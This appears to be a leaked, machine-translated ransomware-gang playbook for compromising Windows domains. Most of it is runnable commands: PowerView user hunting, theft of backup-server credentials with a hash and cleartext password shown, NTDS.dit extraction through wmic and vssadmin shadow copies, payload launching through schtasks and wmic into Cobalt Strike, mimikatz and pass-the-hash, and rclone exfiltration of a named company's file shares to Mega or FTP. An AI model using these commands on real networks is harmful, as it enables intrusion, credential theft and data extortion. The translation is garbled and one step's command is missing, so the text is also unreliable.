We usually need ad_users when we want to find the admin's wheelbarrow, because on the admin's wheelbarrows we can find passwords from the antivirus console, from cloud backups, and so on. Now I'll throw off the manual on the USERHUNTER, with the help of it, we find these cars. We also need ad_users to get the SID from there for the golden ticket, but more on that later
1. make a list of targets
1.1 We open ad_users, we are looking for someone who is potentially interesting to us: admin / engineer / inform technologists / IT
we take account logins from sAMAccountName
1.2 We take a list of domain admins
1.3 put the first and second in the list.txt file

2. Appload power view.
2.1 powershell-import _/home/user/soft/powerview/view.ps1_
2.1 --comment: import power view from /home/user/soft/powerview/view.ps1

2.3 Turn on hunting
2.3.1

instead of 1884 - the PID of the process where we have enough rights to inject.
x64 - or x86 bit depth of the process. see tasklist
In c\programdata\list.txt there should be a list that we did in point No. 1.
after 5-10-20 minutes, watch the result in out.txt. As soon as he finishes, he replenishes it at once. that is, if the file is 0 bytes, it means it works or AB burned (if you burned av, you will see in the box)

Message: ```Getting access to a server with Shadow Protect SPX backups (StorageCraft)
==
1. We go via RDP to one of the servers, in my case it is a SQL server.
2. on the desktop we see the icon of the ShadowProtect SPX software
-> click on it
3. gui opens (if it asks for credits, enter those under which you entered via RDP, or any other YES)
4. On the left in the "Job Summary" block, we see a detailed description of the backup scheme
in the "Name" field - the name of the backup of our server
in the "Destination" field - the place WHERE our spx stores the backups, in the form of SERVA_BA_NAME (SHARE WITH BACKUP ON THIS SERVER)
From our example, we can conclude that all backups are stored in a ball called StorageCraft, and folders with server backups are named after the name of the server itself.
5. Knowing the name of the backup server, we want to get a better idea of its structure, first of all we get the balls with the command "cmd.exe> net view \\COH-DSS3 /ALL", in response we get "Error 5: Access Denied"
6. There is no access, we try to knock with other accounts YES - the answer is the same - error n 5, it would be logical to assume that in order to access the server we need either local admin credits on this very server, or a special user account with dedicated rights
7. Suppose that if this is a dedicated user, then it has a name similar to the software\function:
iterate over logins with the occurrence of substrings (here we need to turn on fantasy):
Storage
Shadow
Protect
Craft
SP
SPX
Backup
BUUser
ETC.
then we do a search on ntds.dit (hashes.txt.ntds) to find the hash, in my case the search was successful and I found the user Humanity.local\SPAdmin (I think it’s clear that this is Shadow Protect Admin) and its hash ce31b806821bec116ba03132ab5b3138, BUT unfortunately the search on cmd5.org did not give any result, and I desperately need a clearpass. (If you have enough hash, then congratulations - you have reached the result)
8. But if you still need a clearpass or you could not find a suitable user, we will understand that if the software somehow knocks on the server, then the credits are known to it, which means they could remain on the server.
Trying to dump hashes
I won’t describe in detail here how to do it, but you should try hashdump (and its legitimate analogues) and logonpasswords (and analogues)
In my case, I used a mimic and dumped lsass, in which I found a clearpass from my SPAdmin account - kerberos:
* Username : SPAdmin
* Domain : COHBackup
* Password : Backup!User
(in my case, for some reason, the domain was not Humanity.local but COHBackup, although you can also knock on Humanity.local (replace with your own value))
9. We go to the explorer, and open the necessary share "\\COH-DSS3\StorageCraft" through it, it asks me for credits, I enter COHBackup\SPAdmin and Backup!User and successfully get access
10. Also in some grids there may be several backup servers, as an option to check this, this is to click on the Backup button in the upper left corner of the gui (immediately after File) then - Destinations -> and we will see what are the ways to save backups

Message: ```NTDS DUMP METHOD
shell wmic /node:"DC01" /user:"DOMAIN\admin" /password:"cleartextpass" process call create "cmd /c vssadmin list shadows >> c:\log.txt"


we make a request for a listing of shadow copies, there is an indication of the date, check that there is a fresh date
almost certainly they are already there, if not, we do it ourselves

net start Volume Shadow Copy
shell wmic /node:"DC01" /user:"DOMAIN\admin" /password:"cleartextpass" process call create "cmd /c vssadmin create shadow /for=C: 2>&1"


further in the listing of shadow copies we find the latest
Shadow Copy Volume: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy55
accordingly we need a copy number for the next command


shell wmic /node:"DC01" /user:"DOMAIN\admin" /password:"cleartextpass" process call create "cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy55\Windows\NTDS\NTDS.dit c:\ temp\log\ & copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy55\Windows\System32\config\SYSTEM c:\temp\log\ & copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy55\Windows\System32\config\SECURITY c :\temp\log\"


in c:\temp\log\ files ntds.dit / security / system should fall
we take a portable console 7z and pack it into an archive with a password
Code: [Highlight]

7za.exe a -tzip -mx5 \\DC01\C$\temp\log.zip \\DC01\C$\temp\log -pTOPSECRETPASSWORD


we download the password-protected archive to ourselves, if we get an error when decrypting the ntds file (the file is damaged), then we do the following


Esentutl /p C:\log\ntds.dit


the trick of this method is that we don’t actually dump anything, we just take and pump out ntds
in order not to get burned by the fact that we are pulling out exactly ntds, we pack it into a password-protected archive

if you have troubles with what they fire and throw out of the network after the ntds dump - try this method
it can be burned only by the very fact of some leaking date from the CD, and it is impossible to analyze what exactly you are dragging without knowing the password from the archive

Unzip, go to the Tor directory and run tor.exe

After a few seconds, it will reach the writing of 100% Done

In the Putty settings, go to the proxy, set socks5, ip 127.0.0.1 port 9050

3) We go through filezilla to the server > go to the "Script" directory - put the AD files next to the script

4) Go to Putty, go to the server, go to the directory where the script is, give the command
./script.sh

5) Done, go back to FilleZilla and pick up our sorted. After yourself, be sure to delete the AD files and the sorted folder, if the sorted folder is not deleted, just change it to any name

Message: ```HOW TO JUMP SESSIONS WITH PAYLOADS

Commands for launching a peloid to bring the session into cobalt
1)shell SCHTASKS /s MS040926754153 /RU "SYSTEM" /create /tn "WindowsSensor15" /tr "cmd.exe /c C:\ProgramData\P32.exe" /sc ONCE /sd 01/01/1970 /st 00: 00
2)shell SCHTASKS /s MS040926754153 /run /TN "WindowsSensor15"
3)shell schtasks /S MS040926754153 /TN "WindowsSensor15" /DELETE /F
instead of
MS040926754153
insert
ipac cars
take turns hammering commands
1) creating a task with a payload
2) cutting in
3) removal


Launching VMICOM we use it more often
1) if it is a DLL, then
shell wmic /node:192.168.104.13 process call create "rundll32.exe C:\ProgramData\x64.dll StartW"

Accordingly, where is the ip, we insert the ip of the machine to which we have access, then the path and the name of our dll follow, I think the syntax is clear

If you are on the RDP > open CMD as administrator and rundll32.exe C:\ProgramData\x64.dll,StartW respectively, you can specify any path, according to where your dll is located


For EXE format or .bat format, launching VMICOM is as follows

shell wmic /node:10.28.0.3 process call create "C:\ProgramData\j1.exe"
```

Message: ```HOW AND WHAT INFO TO DOWNLOAD

1) After we raised the rights, found the Admin Domain, we pull the sessions into cobalt
2) We put on the YES token and remove the balls in this way:
*powershell-import - upload ShareFinder there as usual and give the following command -
psinject 7080 x64 Invoke-ShareFinder -CheckShareAccess -Verbose | Out-File -Encoding ascii C:\ProgramData\found_shares.txt

Next, we study the removed balls, we are interested in
*Finance docks
*Accounting
*Aichi
*Clients
*Projects
And so on, it all depends on what our target is doing

Then we do the following > here is the Manual from Diablo, everything is lego accessible and understandable

Rklon
in order to start downloading via rklon you need to create a config
to create a config, you need to open cmd go to the directory where rclone.exe is located
run rclone.exe with command: rclone config
then select new remote in the menu that appears
call it mega then enter mega again
after that we enter the mega mail address after he asks his pass to enter or generate we choose our letter 'Y'
the pass will not appear when inserted, but it is inserted there anyway
after creating the config, we are thrown into the main menu and we exit the clone.
then we enter this command rclone.exe config show it will show the config itself that we created
we copy it and create the rclone.conf file where we put this info.
after we found the balls we are interested in, we upload the exe and the config to the target machine with rights, we hide the config and the exe so that they would not be found
go to the directory of the executable and give the command: shell rclone.exe copy "\\envisionpharma.com\IT\KLSHARE" Mega:Finanse -q --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12
where: \\envisionpharma.com\IT\KLSHARE is the balls
Mega:Finanse location of files in mega (it can create a folder in mega by itself, you just need to specify it here)
streams 12 --transfers 12 is the number of streams that download to the maximum (12) I do not recommend because you can easily get burned



shell rclone.exe copy "\\PETERLENOVO.wist.local\Users" ftp1:uploads/Users/ -q --ignore-existing --auto-confirm --multi-thread-streams 3 --transfers 3 - here is an example in in this case on FTP

!!! RKLON ITSELF WEIGHS ABOUT 50MB, THE LINK TO IT WILL BE BELOW THE POST!!!

Message: ```INITIAL ACTIONS

1) Removing AD - allows us to find out how many servers and workstations are in the network, as well as information about users, who has what position, etc., after removing hell, we do sorted to sort only what we need - we will show this to you later
2) Removing the ball (sharfinder) - with the help of it, we look where we have access with this user (to other PCs)
3) Kerberos attack - pulls hashes out of memory, with successful removal and successful dehashing - DomainAdmin is provided to us
4) If we have system rights, using the "hashdump" and "logonpasswords" commands, we can pull off the hashes and mimikadz and we will already have the domain user flogged, and sometimes the admin domain
5) If we found the login and hash of the admin domain and at the same time we could not hash the hash, we do the following command pth Domain\Admin pass (in the form of a hash), using the command shell dir \\ip or hostname\c$ we will check access to a server or workstation
6) If we found the login \ pass domain of the admin or user, we can put on his token, the command looks like this make_token Domain \ Admin Pass , if you want to remove the token, the rev2self command
7) If there is a system process on the session, using the getsystem command, you can raise the system rights on the session, point (4)
8) Also, do not forget to look at the processes using the ps command, you can find the user there, migrate to his process> Explore> Process list> then select the user process (the user must be different, not the one in the session) and press inject, select SSL listener
9) After migrating to a new user, you also need to remove the balls to see where you can break through with him
10) When you remove the shares, then at the end of the removal to the C:\ProgramData directory and there is sh.txt or shares.txt , download, see how many "remote admin" are in the textbook, if there are more than one, then this means that access is on another computer
11) Click on the session > File Browser > write the path \\ip or hostname of the computer to which you have access\c$ , put the peloid there, I'll give it out later
12) Launching a peloid depends on its format exe or dll, after launching I will personally explain later
13) Ping servers and workstations like this, we need p.bat, I will throw it into the group. We create a txt, call it domains.txt, add the hostnames of servers or workers there. Hostnames are taken from the removed AD, with the help of a script, we will show them how to use
14) If you find some kind of password, you can also run it through smb_login - this is a tool in metasploit, I will issue a metasploit and tell you how to use it. smb_login will show to which servers or workers, there is access with these credits
